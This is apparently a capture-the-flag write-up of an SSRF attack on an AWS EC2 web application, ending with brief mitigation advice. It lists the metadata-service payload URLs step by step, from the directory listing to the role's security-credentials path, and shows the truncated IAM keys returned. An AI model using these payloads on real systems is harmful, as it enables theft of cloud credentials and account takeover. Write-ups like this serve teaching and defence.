---
title: "AWS EC2 Exploitation: Stealing IAM Credentials"
date: 2025-12-27 12:00:00 +0200
categories: [Cloud Security, AWS]
tags: [ctf, ssrf, aws, ec2, red-teaming]
---

## Introduction

Server-Side Request Forgery (SSRF) is a critical vulnerability in cloud environments. In this write-up, I demonstrate how I exploited an SSRF vulnerability on an AWS EC2 instance to access the **Instance Metadata Service (IMDS)** and exfiltrate **IAM Security Credentials**.

## Phase 1: Reconnaissance

I identified a web application taking URL input. To test for SSRF, I injected the AWS "Magic IP":

```http
[http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)
Result: The server returned the metadata directory, confirming it is vulnerable and using IMDSv1.

Phase 2: Exploitation
1. Retrieving the Instance ID
I queried the instance-id endpoint: http://169.254.169.254/latest/meta-data/instance-id

2. Stealing IAM Credentials (The Kill Chain)
To escalate privileges, I enumerated the IAM role name: latest/meta-data/iam/security-credentials/ Result: ec2-prod-role

Then, I constructed the final payload to steal the keys:

HTTP

[http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role](http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role)
Phase 3: Exfiltration
The server responded with the temporary credentials:

JSON

{
  "Code" : "Success",
  "AccessKeyId" : "ASIAQ3EGUZ...",
  "SecretAccessKey" : "EBvAKCmU...",
  "Token" : "IQoJb3Jp..."
}
Mitigation
To prevent this:

Enforce IMDSv2 (Requires Session Token).

Implement strict Input Validation.
